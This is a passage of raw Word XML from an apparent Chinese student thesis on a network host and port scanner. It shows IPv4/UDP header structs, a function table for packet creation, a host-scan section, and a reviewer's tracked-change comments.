          <w:p w14:paraId="172E80A2" w14:textId="77777777" w:rsidR="00A64E0D" w:rsidRPr="00E90326" w:rsidRDefault="00A64E0D" w:rsidP="00CF6272">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7BDAA35E" w14:textId="77777777" w:rsidR="00A64E0D" w:rsidRDefault="00A64E0D" w:rsidP="00A64E0D">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表中的结构体：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DBA3EAB"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ip_address{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D02E0CA"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byte1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="327687D7"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byte2;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08461083"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byte3;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F4170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byte4;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5622DAAB" w14:textId="11B42BF9" w:rsidR="00A64E0D" w:rsidRPr="00E90326" w:rsidRDefault="00FD5A53" w:rsidP="00FD5A53">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>}ip_address;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122BBE05"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 IPv4 header */</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33258ED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ip_header{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42E6DEAC" w14:textId="77777777" w:rsidR="00A64E0D" w:rsidRPr="00E90326" w:rsidRDefault="00A64E0D" w:rsidP="00A64E0D">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:left="840"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF94846"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4F566C76"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418BCC33"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2B25987F"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5C57FD0D"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ttl;            // Time to live</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3693CF6A"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u_char  proto;          // Protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F88DA5E"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crc;            // Header checksum</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202E1F3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ip_address  saddr;      // Source address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24705D5E"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05BAB791"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lastRenderedPageBreak/>
        <w:tab/>
        <w:t>u_int   op_pad;         // Option + Padding</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6720F60A" w14:textId="77777777" w:rsidR="00A64E0D" w:rsidRPr="00E90326" w:rsidRDefault="00A64E0D" w:rsidP="00A64E0D">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>}ip_header;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768BB89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 UDP header*/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69358CB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typedef struct udp_header{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4663245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sport;          // Source port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6474EBE0"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dport;          // Destination port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7489CFE8"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len;            // Datagram length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F9E7D2" w14:textId="77777777" w:rsidR="00A64E0D" w:rsidRPr="00E90326" w:rsidRDefault="00A64E0D" w:rsidP="00A64E0D">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:afterLines="0" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:tab/>
        <w:t>u_short crc;            // Checksum</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53721FC0" w14:textId="5F479F45" w:rsidR="00837D36" w:rsidRPr="00817C71" w:rsidRDefault="00A64E0D" w:rsidP="00817C71">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>}udp_header;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717B992A" w14:textId="77777777" w:rsidR="00BC7545" w:rsidRPr="00F63841" w:rsidRDefault="00BC7545" w:rsidP="00BC7545">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1090" w:name="_Toc482522644"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>主要函数</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1090"/>
    </w:p>
    <w:p w14:paraId="1EF30650" w14:textId="38EA1BBA" w:rsidR="00837D36" w:rsidRPr="001C4DAF" w:rsidRDefault="00AC2045" w:rsidP="00AA0041">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>如表</w:t>
      </w:r>
      <w:r>
        <w:t>4.6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>所示，</w:t>
      </w:r>
      <w:r w:rsidR="00837D36" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>CreatePacket</w:t>
      </w:r>
      <w:r w:rsidR="00837D36">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>用于创建UDP数据包，</w:t>
      </w:r>
      <w:r w:rsidR="00837D36" w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>SendPacket</w:t>
      </w:r>
      <w:r w:rsidR="00837D36">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>用于发送数据包。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C45F3E4" w14:textId="27BF26BB" w:rsidR="00837D36" w:rsidRDefault="00837D36" w:rsidP="00837D36">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表</w:t>
      </w:r>
      <w:r w:rsidR="00AC2045">
        <w:t>4.6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>端口扫描函数说明</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af2"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1896"/>
        <w:gridCol w:w="3290"/>
        <w:gridCol w:w="3116"/>
      </w:tblGrid>
      <w:tr w:rsidR="00837D36" w:rsidRPr="00E90326" w14:paraId="777EB190" w14:textId="77777777" w:rsidTr="00CF6272">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="52AA60F2"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函数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="6D560C23"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参数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="191C8DF5"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功能</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00837D36" w:rsidRPr="00E90326" w14:paraId="12094046" w14:textId="77777777" w:rsidTr="00CF6272">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="526EDF0B"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getICMP()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="026F7B0C"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LPVOID lpParameter</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="09D02ADE"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837D36" w:rsidRPr="00E90326" w14:paraId="4DACD002" w14:textId="77777777" w:rsidTr="00CF6272">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="07F37BB1"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rPr>
              <w:t>CreatePacket()</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="22DCD75C"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SourceMAC,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D3E9A09"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DestinationMAC,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35A8108B" w14:textId="77777777" w:rsidR="00837D36" w:rsidRPr="00E90326" w:rsidRDefault="00837D36" w:rsidP="00CF6272">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>unsigned int   SourceIP,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B8F6859" w14:textId="77777777" w:rsidR="00837D36" w:rsidRPr="00E90326" w:rsidRDefault="00837D36" w:rsidP="00CF6272">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>unsigned int   DestinationIP,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17A2D0D6" w14:textId="77777777" w:rsidR="00837D36" w:rsidRPr="00E90326" w:rsidRDefault="00837D36" w:rsidP="00CF6272">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>unsigned short SourcePort,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C32658D" w14:textId="77777777" w:rsidR="00837D36" w:rsidRPr="00E90326" w:rsidRDefault="00837D36" w:rsidP="00CF6272">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>unsigned short DestinationPort,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="146EBAD3" w14:textId="77777777" w:rsidR="00837D36" w:rsidRPr="00E90326" w:rsidRDefault="00837D36" w:rsidP="00CF6272">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:afterLines="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>unsigned char* UserData,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7701FA01" w14:textId="77777777" w:rsidR="00837D36" w:rsidRPr="00E90326" w:rsidRDefault="00837D36" w:rsidP="00CF6272">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
              <w:t>unsigned int   DataLen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
          </w:tcPr>
          <w:p w14:paraId="21E0F1E6" w14:textId="77777777" w:rsidR="00837D36" w:rsidRPr="00E90326" w:rsidRDefault="00837D36" w:rsidP="00CF6272">
            <w:pPr>
              <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E90326">
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
              </w:rPr>
              <w:t>创建UDP数据包</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4BB2CDFE" w14:textId="77777777" w:rsidR="00802D67" w:rsidRPr="00802D67" w:rsidRDefault="00802D67" w:rsidP="00802D67">
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pP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1091" w:name="_Hlt270282272"/>
      <w:bookmarkStart w:id="1092" w:name="_Hlt273261567"/>
      <w:bookmarkStart w:id="1093" w:name="_Toc482141265"/>
      <w:bookmarkStart w:id="1094" w:name="_Toc482141938"/>
      <w:bookmarkStart w:id="1095" w:name="_Toc482522645"/>
      <w:bookmarkStart w:id="1096" w:name="_Hlt273362659"/>
      <w:bookmarkEnd w:id="1065"/>
      <w:bookmarkEnd w:id="1091"/>
      <w:bookmarkEnd w:id="1092"/>
      <w:r w:rsidRPr="00E90326">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>本章小结</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1093"/>
      <w:bookmarkEnd w:id="1094"/>
      <w:bookmarkEnd w:id="1095"/>
    </w:p>
    <w:bookmarkEnd w:id="1096"/>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0299FE5D" w14:textId="329D948F" w:rsidR="00EE5497" w:rsidRPr="00E90326" w:rsidRDefault="00EE5497" w:rsidP="00B40C66">
      <w:pPr>
        <w:pStyle w:val="10505"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="432"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="both"/>
        <w:sectPr w:rsidR="00EE5497" w:rsidRPr="00E90326">
          <w:headerReference w:type="default" r:id="rId36"/>
          <w:pgSz w:w="11906" w:h="16838"/>
          <w:pgMar w:top="1440" w:right="1797" w:bottom="1440" w:left="1797" w:header="851" w:footer="992" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="312"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="543F6A6F" w14:textId="0668E20C" w:rsidR="00F167C1" w:rsidRPr="00E90326" w:rsidRDefault="00F167C1" w:rsidP="00F167C1">
      <w:pPr>
        <w:pStyle w:val="10505"/>
        <w:spacing w:before="120" w:after="120" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1097" w:name="_Hlt273463977"/>
      <w:bookmarkStart w:id="1098" w:name="_Toc482522646"/>
      <w:bookmarkStart w:id="1099" w:name="_Toc482141266"/>
      <w:bookmarkEnd w:id="1097"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>程序实现</w:t>
      </w:r>
      <w:ins w:id="1100" w:author="renxt" w:date="2017-05-13T21:00:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:b/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1101" w:author="renxt" w:date="2017-05-13T21:01:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:b/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:t>流程图属设计吧。不要引用大量代码，只引用</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1102" w:author="renxt" w:date="2017-05-13T21:02:00Z">
        <w:r w:rsidR="00567841">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:b/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:t>部分</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1103" w:author="renxt" w:date="2017-05-13T21:01:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:b/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:t>关键代码。把这部分</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1104" w:author="renxt" w:date="2017-05-13T21:02:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:b/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:t>合并到第4章吧</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1105" w:author="renxt" w:date="2017-05-13T21:04:00Z">
        <w:r w:rsidR="006D52D6">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:b/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:t>。参考张海阳的</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1106" w:author="renxt" w:date="2017-05-13T21:00:00Z">
        <w:r w:rsidR="00EA0369">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorEastAsia" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorEastAsia" w:hint="eastAsia"/>
            <w:b/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
      </w:ins>
      <w:bookmarkEnd w:id="1098"/>
    </w:p>
    <w:p w14:paraId="443E7403" w14:textId="6305131C" w:rsidR="009E4AA0" w:rsidRDefault="008E5F79" w:rsidP="009E4AA0">
      <w:pPr>
        <w:pStyle w:val="20505"/>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1107" w:name="_Toc482522647"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>主机扫描</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1107"/>
    </w:p>
    <w:p w14:paraId="54BB0F1C" w14:textId="5F0A7BCD" w:rsidR="004D18B3" w:rsidRPr="00285EBE" w:rsidRDefault="00132EC3" w:rsidP="004D18B3">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="5115"/>
        </w:tabs>
        <w:spacing w:before="120" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1108" w:name="_Toc482522648"/>
      <w:r w:rsidRPr="00596B1B">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:b/>
          <w:rPrChange w:id="1109" w:author="李勇" w:date="2017-05-13T21:45:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>hostScan</w:t>
      </w:r>
      <w:r w:rsidR="004D18B3" w:rsidRPr="00C40D86">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>函数</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1108"/>
    </w:p>
    <w:p w14:paraId="4B2960E1" w14:textId="5BFFBBAB" w:rsidR="009E4AA0" w:rsidRDefault="009E4AA0" w:rsidP="00F167C1">
      <w:pPr>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="360" w:lineRule="exact"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>主机扫描是通过</w:t>
      </w:r>
      <w:r w:rsidRPr="009E4AA0">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>hostScan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数进行，</w:t>
      </w:r>
      <w:r w:rsidRPr="009E4AA0">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>hostScan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数的流程图如，</w:t>
      </w:r>
      <w:r w:rsidR="0085437C">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>调用</w:t>
      </w:r>
      <w:r w:rsidR="0085437C" w:rsidRPr="009E4AA0">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
        </w:rPr>
        <w:t>objPing.Ping</w:t>
      </w:r>
      <w:r w:rsidR="0085437C">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>将扫描的起始IP到终点IP依次进行扫描。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717B44A7" w14:textId="77777777" w:rsidR="00C0192E" w:rsidRDefault="007D3B90" w:rsidP="00C0192E">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:beforeLines="0" w:before="120" w:afterLines="0" w:after="120" w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3E0F0CB6" wp14:editId="62678A0A">
            <wp:extent cx="3215919" cy="571549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5919" cy="5715495"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC91C97" w14:textId="200610C7" w:rsidR="005A512D" w:rsidRPr="00F86F4A" w:rsidRDefault="00C0192E" w:rsidP="00C0192E">
      <w:pPr>
        <w:pStyle w:val="af3"/>
        <w:spacing w:before="120" w:after="120"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F86F4A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">图5. </w:t>
      </w:r>
      <w:r w:rsidRPr="00F86F4A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidRPr="00F86F4A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00F86F4A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:hint="eastAsia"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:instrText>SEQ 图5. \* ARABIC</w:instrText>
      </w:r>
      <w:r w:rsidRPr="00F86F4A">
        <w:rPr>
